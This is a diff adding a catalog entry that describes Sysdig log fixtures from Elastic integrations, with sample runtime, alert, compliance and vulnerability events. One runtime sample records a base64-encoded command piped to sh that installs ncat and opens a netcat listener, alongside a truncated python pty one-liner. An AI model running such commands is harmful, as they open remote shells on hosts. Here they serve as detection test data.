@@ -1,0 +1,107 @@
+id: sysdig
+name: Sysdig
+short: Sysdig
+vendor: Sysdig
+category: saas
+status: full
+updated: '2026-11-12'
+contributors:
+  - wlinde
+aka:
+  - sysdig
+  - Elastic integrations
+tags:
+  - elastic
+  - json
+summary: Sysdig is logged by the Elastic integrations package sysdig. The Pack Generator samples pool holds fixture events for 4 sourcetypes. This article describes those fixtures and does not add CVE history.
+sourcetypes:
+  - st: sysdig
+    desc: 'Elastic integrations fixture, 7 events. Upstream: sysdig/data_stream/event/_dev/test/pipeline/test-event.log'
+  - st: sysdig_alerts
+    desc: 'Elastic integrations fixture, 9 events. Upstream: sysdig/data_stream/alerts/_dev/test/pipeline/test-sysdig.log'
+  - st: sysdig_cspm
+    desc: 'Elastic integrations fixture, 10 events. Upstream: sysdig/data_stream/cspm/_dev/test/pipeline/test-cspm.log'
+  - st: sysdig_vulnerability
+    desc: 'Elastic integrations fixture, 5 events. Upstream: sysdig/data_stream/vulnerability/_dev/test/pipeline/test-vulnerability.log'
+facts:
+  Where the sample comes from: Elastic integrations
+  Integration package: sysdig
+  Sourcetypes: '4'
+  Fixture events: '31'
+  Log format seen: json
+  Fields in the first fixture: category, content.fields.container.image.repository, content.fields.container.name, content.fields.evt.res, content.fields.evt.type, content.fields.group.gid
+placement:
+  slots:
+    - cloud
+  items:
+    - slot: cloud
+      title: Elastic integrations
+      desc: Fixtures were harvested from elastic/integrations. The product may also be deployed on a network or an endpoint; this article only places the source of the sample.
+howItWorks:
+  - title: What the fixture shows
+    body: Sysdig events in this library are the test fixtures shipped with elastic/integrations (cbfff90638). The first event carries category, content.fields.container.image.repository, content.fields.container.name, content.fields.evt.res, content.fields.evt.type, content.fields.group.gid. Values in the sample were rewritten to documentation addresses.
+traffic:
+  handles:
+    - json
+  flow:
+    - step: Collect
+      desc: The Elastic integrations package reads sysdig and the samples pool stores the fixture used here.
+    - step: Parse
+      desc: Secpedia reads the fixture as json.
+logs:
+  - type: Event
+    sourcetype: sysdig
+    format: json
+    desc: 7 fixture events in the samples pool (elastic).
+    sample: '{"category":"runtime","content":{"fields":{"container.image.repository":"docker.io/library/python","container.name":"shell-scripting","evt.res":"SUCCESS","evt.type":"execve","group.gid":"0","group.name":"root","proc.args":"","proc.cmdline":"sh","proc.cwd":"/","proc.exepath":"/usr/bin/dash","proc.hash.sha256":"f5adb8bf0100ed0f8c7782ca5f92814e9229525a4b4e0d401cf3bea09ac960a6","proc.name":"sh","proc.pcmdline":"bash -c echo IyEvYmluL2Jhc2gKYXB0IHVwZGF0ZSAteTsgYXB0IGluc3RhbGwgLXkgbmNhdApuYyAtbHYgMTMzNyAmCg== | base64 -d | sh; echo cHl0aG9uMyAtYyAnaW1wb3J0IG9zLHB0eSxz...","proc.pid":"1890726","proc.pid.ts":"1744002001003626585","proc.pname":"bash","proc.ppid":"1890704","proc.ppid.ts":"1744002000895807711","proc.sid":"1","user.loginname":"<NA>","user.loginuid":"-1","user.name":"root","user.uid":"0"},"origin":"Secure UI","output":"Custom rule. The shell-scripting with image docker.io/library/python by parent bash under user root (proc.name=sh proc.exepath-custom=/usr/bin/dash proc.pnam...","policyId":10569534,"ruleName":"My test rule custom","ruleSubType":0,"ruleTags":["My-tag-custom-1-hello-world","MITTRE-WHATEVER"],"ruleType":6,"type":"workloadRuntimeDetection"},"description":"This is just a dumb policy to test custom policies","engine":"falco","id":"1a33f0946dabcdefabcdefad5c3e7f22","labels":{"cloudProvider.account.id":"123456789012","cloudProvider.name":"gcp","cloudProvider.region":"us-central1","container.image.digest":"sha256:aa7b73608abcfb0212401234567890123456789abcdefa610681097a54ca2c2a","container.image.id":"ef0abcdefbd2","container.image.repo":"docker.io/library/python","container.image.tag":"3.9.18-slim","container.label.io.kubernetes.container.name":"shell-scripting","container.label.io.kubernetes.pod.name":"shell-scripting-abcdef12-12345","container.label.io.kubernetes.pod.namespace":"default","container.name":"shell-scripting","gcp.location":"us-central1","gcp.projectId":"1231456789012","host.hostName":"gke-cluster-gcp-demo-san-default-pool-11234abc-abcd","host.mac":"2001:db8::1","kubernetes.cluster.name":"gke-alliances-demo-6","kubernetes.cronJob.name":"shell-scripting","kubernetes.job.name":"shell-scripting-29066700","kubernetes.namespace.name":"default","kubernetes.node.name":"gke-cluster-gcp-demo-san-default-pool-11234abc-abcd","kubernetes.pod.name":"shell-scripting-abcdef12-12345","kubernetes.workload.name":"shell-scripting","kubernetes.workload.type":"cronjob"},"name":"Manuel test policy","originator":"policy","rawEventCategory":"runtime","rawEventOriginator":"linuxAgent","severity":4,"source":"syscall","sourceDetails":{"subType":"container","type":"workload"},"timestamp":1744772461195149800}'
+    key:
+      - category
+      - content.fields.container.image.repository
+      - content.fields.container.name
+      - content.fields.evt.res
+  - type: Alerts
+    sourcetype: sysdig_alerts
+    format: json
+    desc: 9 fixture events in the samples pool (elastic).
+    sample: '{"id":"17dec715376910362c8c3f62a4ceda2e","type":"policy","timestamp":1720031001639981000,"timestampRFC3339Nano":"2024-07-03T18:23:21.63998111Z","originator":"policy","category":"runtime","source":"syscall","name":"Sysdig Runtime Activity Logs","description":"This policy contains rules which provide a greater insight into general activities occuring on the system. They are very noisy, but useful in threat hunting ...","severity":7,"agentId":58014837,"containerId":"6949e5f10829","machineId":"2001:db8::1","hostMac":"2001:db8::1","content":{"ruleName":"User Management Event Detected","ruleType":"RULE_TYPE_FALCO","ruleTags":["host","container"],"output":"Users management command userdel tmp_suid_user launched by pwsh on threatgen under user root (proc.name=userdel proc.args=tmp_suid_user fd.name=<NA> proc.cmd...","fields":{"container.name":"threatgen","proc.cmdline":"userdel tmp_suid_user","proc.cwd":"/tmp/","proc.exepath":"/usr/sbin/userdel","proc.name":"userdel","proc.pcmdline":"pwsh -c (./RunTests.ps1 STDIN.NETWORK DEV.SHM.EXEC T1048 RECON.FIND.SUID T1611.002 CONTAINER.ESCAPE.NSENTER CREDS.DUMP.MEMORY KILL.MALICIOUS.PROC LOAD.BPF.PR...","proc.pid":"2140169","proc.pname":"pwsh","proc.ppid":"2140088","user.name":"root","user.uid":"0"},"policyVersion":35,"policyOrigin":"Sysdig"},"labels":{"cloudProvider.account.id":"289645096542","cloudProvider.name":"gcp","cloudProvider.region":"us-central1","gcp.availabilityZone":"us-central1-c","gcp.instanceId":"648229130641697246","gcp.instanceName":"gke-cluster-gcp-demo-san-default-pool-66250c41-vd1o","gcp.machineType":"e2-standard-4","gcp.projectId":"289645096542","gcp.projectName":"alliances-chronicle","host.hostName":"gke-cluster-gcp-demo-san-default-pool-66250c41-vd1o","kubernetes.cluster.name":"gke-alliances-demo-6","kubernetes.namespace.name":"default","kubernetes.pod.name":"threatgen-c65cf6446-5s8kk","kubernetes.workload.type":"deployment"}}'
+    key:
+      - id
+      - type
+      - timestamp
+      - timestampRFC3339Nano
+  - type: Cspm
+    sourcetype: sysdig_cspm
+    format: json
+    desc: 10 fixture events in the samples pool (elastic).
+    sample: '{"acceptedCount":0,"control":{"acceptedCount":0,"authors":"Sysdig","description":"Enabling MFA provides increased security for console access as it requires the authenticating principal to possess a device that displays a time-sensitive ke...","id":"16011","isManual":false,"lastUpdate":"1736935526","name":"IAM - Defined Users MFA (AWS)","objectsCount":0,"pass":true,"passingCount":0,"platform":"","remediationId":"16011","resourceApiEndpoint":"/api/cspm/v1/cloud/resources?controlId=16011&providerType=AWS&resourceKind=AWS_USER&filter=policyId=15 and zones.id=17769377","resourceKind":"AWS_USER","severity":"High","supportedDistributions":[{"maxVersion":0,"minVersion":0,"name":"aws"}],"target":"AWS","type":9},"description":"Multi-Factor Authentication (MFA) adds an extra layer of authentication assurance beyond traditional credentials. With MFA enabled, when a user signs in to t...","failedControls":0,"highSeverityCount":0,"lowSeverityCount":0,"mediumSeverityCount":0,"name":"1.10 Ensure multi-factor authentication (MFA) is enabled for all IAM users that have a console password","pass":true,"passingCount":0,"policyId":"15","policyName":"CIS Amazon Web Services Foundations Benchmark","requirementId":"16009","severity":"High","zone":{"id":"17769377","name":"Entire Infrastructure"}}'
+    key:
+      - acceptedCount
+      - control.acceptedCount
+      - control.authors
+      - control.description
+  - type: Vulnerability
+    sourcetype: sysdig_vulnerability
+    format: json
+    desc: 5 fixture events in the samples pool (elastic).
+    sample: '{"assetType":"containerImage","metadata":{"architecture":"amd64","author":"","baseOs":"debian 11.7","createdAt":"2023-08-04T19:58:39.877819767Z","digest":"sha256:6e5c705adbdfd7aeff8d2d437f16f886a9c2b9723922088aa6e6a99428b3de08","imageId":"sha256:38789e38e9e97ec6d3a1d640d05a2c07813457ea432787f3cd9e87759ea35e4e","labels":{"homepage":"https://example.com","maintainer":"example Team <user@example.com>","org.label-schema.build-date":"2023-08-04T19:55:38Z","org.label-schema.name":"example-kubernetes-operator","org.label-schema.vcs-ref":"7992cc9","org.label-schema.vcs-url":"''https://github.com/example/example-kubernetes-operator''","org.opencontainers.image.description":"The example CLI, in a Docker container.","repository":"https://github.com/example/example"},"os":"linux","pullString":"docker.io/example/example-kubernetes-operator:v1.13.0","size":4797821440},"package":{"isRemoved":false,"isRunning":false,"license":"example","layers":{"baseImages":[{"baseImagesRef":"0000","pullStrings":["docker.cloudsmith.io/secure/sysdig/alpine:latest"]},{"baseImagesRef":"0001","pullStrings":["docker.cloudsmith.io/secure/sysdig/alpine0001:latest"]}],"command":"ADD alpine-minirootfs-3.21.3-aarch64.tar.gz / # buildkit","digest":"sha256:a16e98724c05975ee8c40d8fe389c3481373d34ab20a1cf52ea2accc43f71f4c","index":0,"layerRef":"f95aa9ae66563e7e808b","size":null},"name":"golang.org/x/net","packageRef":"183a66d2b001cb5300a3490b85cf17a7","path":"/usr/bin/ctr","suggestedFix":"v0.17.0","type":"golang","version":"v0.0.0-20220722155237-a158d28d115b","vulnerability":{"cisaKev":{},"cvssScore":{"score":6.5,"vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H","version":"3.1"},"disclosureDate":"1999-01-01","exploitable":false,"fixVersion":"2.9.10+dfsg-6.7+deb11u6","mainProvider":"nvd","name":"CVE-2023-45322","packageRef":"183a66d2b001cb5360428446966ff971","providersMetadata":{},"riskAccepts":[{"context":[{"type":"imageName","value":"nginx:latest"}],"createdAt":"2024-01-22T08:51:46.016464Z","description":"description","entityType":"imageName","entityValue":"nginx:latest","expirationDate":"2021-07-01","id":"550e8400-e29b","reason":"RiskMitigated","riskAcceptRefs":"e6b4b0d3255bfef","status":"active","updatedAt":"2024-01-22T08:51:46.016464Z"}],"severity":"medium","vulnerabilitiesRef":"183a66d2b001cb53ab718da7114e48fe"}},"producer":{"producedAt":"2025-04-28T06:14:20.641561Z"},"stage":"runtime"}'
+    key:
+      - assetType
+      - metadata.architecture
+      - metadata.author
+      - metadata.baseOs
+cves: []
+detections:
+  - title: Sysdig events arriving
+    severity: low
+    signals:
+      - category
+      - content.fields.container.image.repository
+      - content.fields.container.name
+    why: Confirms this source is present. It is not a vulnerability claim.
+    kql: '| where sourcetype == "sysdig"'
+optimizations: []
+references:
+  - title: elastic/integrations sysdig/data_stream
+    url: https://github.com/elastic/integrations/blob/cbfff90638a7565377768f50726775c0febc7bf4/packages/sysdig/data_stream/event/_dev/test/pipeline/test-event.log
+  - title: Pack Generator sample sysdig.json
+    url: https://github.com/wvdlinde-cribl/cribl-pack-samples/blob/main/samples/sysdig.json
